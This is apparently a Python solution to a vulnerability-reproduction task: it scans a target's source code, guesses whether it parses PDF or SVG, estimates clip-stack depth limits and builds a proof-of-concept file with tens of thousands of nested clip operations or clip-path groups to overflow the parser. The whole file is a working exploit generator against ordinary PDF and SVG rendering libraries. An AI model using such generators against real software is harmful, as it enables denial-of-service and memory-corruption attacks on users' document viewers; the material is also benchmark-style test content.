import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


class Solution:
    def _iter_text_files(self, src_path: str, max_file_size: int = 2_000_000) -> Iterable[Tuple[str, str]]:
        def try_decode(b: bytes) -> Optional[str]:
            if not b:
                return ""
            try:
                return b.decode("utf-8", errors="ignore")
            except Exception:
                return None

        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    p = os.path.join(root, fn)
                    lp = p.lower()
                    if not any(lp.endswith(ext) for ext in (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".m", ".mm", ".py", ".rs", ".go", ".java", ".js", ".ts")):
                        continue
                    try:
                        st = os.stat(p)
                        if st.st_size > max_file_size:
                            continue
                        with open(p, "rb") as f:
                            b = f.read(max_file_size + 1)
                        if len(b) > max_file_size:
                            continue
                        s = try_decode(b)
                        if s is None:
                            continue
                        yield p, s
                    except Exception:
                        continue
            return

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    lname = name.lower()
                    if m.size <= 0 or m.size > max_file_size:
                        continue
                    if not any(lname.endswith(ext) for ext in (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".m", ".mm", ".py", ".rs", ".go", ".java", ".js", ".ts")):
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        b = f.read(max_file_size + 1)
                        if len(b) > max_file_size:
                            continue
                        s = try_decode(b)
                        if s is None:
                            continue
                        yield name, s
                    except Exception:
                        continue
        except Exception:
            return

    def _detect_kind_and_depth(self, src_path: str) -> Tuple[str, int]:
        score: Dict[str, int] = {"pdf": 0, "svg": 0, "swf": 0, "psd": 0, "unknown": 0}
        const_candidates: List[int] = []

        pdf_kw = (
            "mupdf", "fitz.h", "fz_open_document", "fz_new_context", "pdf_", "poppler",
            "fpdf_loadmemdocument", "fpdf_loadmemdocument64", "fpdfview.h", "qpdf", "podofo",
            "xpdf", "pdfium", "cpdf", "pdfparse", "pdf_parse", "pdfdocument"
        )
        svg_kw = ("librsvg", "rsvg_handle_new_from_data", "rsvg_handle_read_stream", "sksvg", "svgdom", "<svg", "svg::", "svg_parse")
        swf_kw = ("swf", "flash", "avm2", "actionscript", "define_sprite", "placeobject", "tag_placeobject")
        psd_kw = ("psd", "photoshop", "8bps", "layer", "clipping")

        fuzz_markers = ("llvmfuzzertestoneinput", "afl", "honggfuzz", "libfuzzer", "fuzz")

        re_defs = [
            re.compile(r"(?i)#\s*define\s+[a-z0-9_]*(?:max|kmax)[a-z0-9_]*(?:depth|nest|stack)[a-z0-9_]*\s+([0-9]{1,7})"),
            re.compile(r"(?i)\b(?:const|static)\s+(?:int|unsigned|size_t|uint32_t|uint64_t)\s+[a-z0-9_]*(?:max|kmax)[a-z0-9_]*(?:depth|nest|stack)[a-z0-9_]*\s*=\s*([0-9]{1,7})"),
            re.compile(r"(?i)\b[a-z0-9_]*(?:clip|layer)[a-z0-9_]*stack[a-z0-9_]*\s*\[\s*([0-9]{1,7})\s*\]"),
            re.compile(r"(?i)\b(?:max|kmax)[a-z0-9_]*(?:clip|layer)[a-z0-9_]*(?:depth|nest|stack)[a-z0-9_]*\b[^;\n]{0,80}?([0-9]{1,7})"),
        ]

        total_read = 0
        max_total_read = 12_000_000

        for path, txt in self._iter_text_files(src_path):
            if total_read > max_total_read:
                break
            total_read += len(txt)

            low = txt.lower()
            name_low = path.lower()

            if any(k in name_low for k in ("pdf", "mupdf", "poppler", "pdfium")):
                score["pdf"] += 6
            if any(k in name_low for k in ("svg", "rsvg", "librsvg", "sksvg")):
                score["svg"] += 6
            if "swf" in name_low:
                score["swf"] += 4
            if "psd" in name_low:
                score["psd"] += 4

            if any(m in name_low for m in fuzz_markers) or any(m in low for m in fuzz_markers):
                score["unknown"] += 1

            for k in pdf_kw:
                if k in low:
                    score["pdf"] += 3
            for k in svg_kw:
                if k in low:
                    score["svg"] += 3
            for k in swf_kw:
                if k in low:
                    score["swf"] += 2
            for k in psd_kw:
                if k in low:
                    score["psd"] += 1

            if ("clip" in low and ("stack" in low or "nest" in low or "depth" in low)) or "layer/clip stack" in low:
                for r in re_defs:
                    for m in r.finditer(txt):
                        try:
                            v = int(m.group(1))
                        except Exception:
                            continue
                        if 8 <= v <= 500_000:
                            const_candidates.append(v)

        kind = max(score.items(), key=lambda kv: kv[1])[0]
        if kind == "unknown":
            kind = "pdf" if score["pdf"] >= score["svg"] else "svg"

        n = 55_000  # fallback near known corpus size; should reliably exceed most stack limits
        if const_candidates:
            const_candidates.sort()
            plausible = [v for v in const_candidates if 8 <= v <= 200_000]
            if plausible:
                base = plausible[len(plausible) // 2]
                if base <= 256:
                    n = 4000
                elif base <= 1024:
                    n = min(15000, base * 8 + 512)
                else:
                    n = min(60000, base * 3 + 1024)
            else:
                n = 55_000

        return kind, int(n)

    def _build_pdf(self, content: bytes) -> bytes:
        header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"

        parts: List[bytes] = [header]
        offsets = [0] * 5
        cur = len(header)

        def add_obj(num: int, body: bytes) -> None:
            nonlocal cur
            offsets[num] = cur
            obj = (f"{num} 0 obj\n".encode("ascii") + body + b"\nendobj\n")
            parts.append(obj)
            cur += len(obj)

        add_obj(1, b"<< /Type /Catalog /Pages 2 0 R >>")
        add_obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        add_obj(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Resources <<>> /Contents 4 0 R >>")

        stream_dict = b"<< /Length " + str(len(content)).encode("ascii") + b" >>"
        stream_obj = stream_dict + b"\nstream\n" + content + b"\nendstream"
        add_obj(4, stream_obj)

        xref_off = cur
        xref = [b"xref\n0 5\n", b"0000000000 65535 f \n"]
        for i in range(1, 5):
            xref.append(f"{offsets[i]:010d} 00000 n \n".encode("ascii"))

        trailer = (
            b"trailer\n<< /Size 5 /Root 1 0 R >>\n"
            b"startxref\n" + str(xref_off).encode("ascii") + b"\n%%EOF\n"
        )

        parts.extend(xref)
        parts.append(trailer)
        return b"".join(parts)

    def _make_pdf_poc(self, n: int) -> bytes:
        line = b"0 0 1 1 re W n\n"
        content = b"q\n" + (line * n) + b"0 0 1 1 re f\nQ\n"
        return self._build_pdf(content)

    def _make_svg_poc(self, n: int) -> bytes:
        pre = (
            b'<?xml version="1.0" encoding="UTF-8"?>\n'
            b'<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">\n'
            b'<defs><clipPath id="c"><rect x="0" y="0" width="1" height="1"/></clipPath></defs>\n'
        )
        open_g = b'<g clip-path="url(#c)">\n'
        close_g = b"</g>\n"
        body = open_g * n + b'<rect x="0" y="0" width="1" height="1"/>\n' + close_g * n
        post = b"</svg>\n"
        return pre + body + post

    def solve(self, src_path: str) -> bytes:
        kind, n = self._detect_kind_and_depth(src_path)
        if kind == "svg":
            return self._make_svg_poc(n)
        return self._make_pdf_poc(n)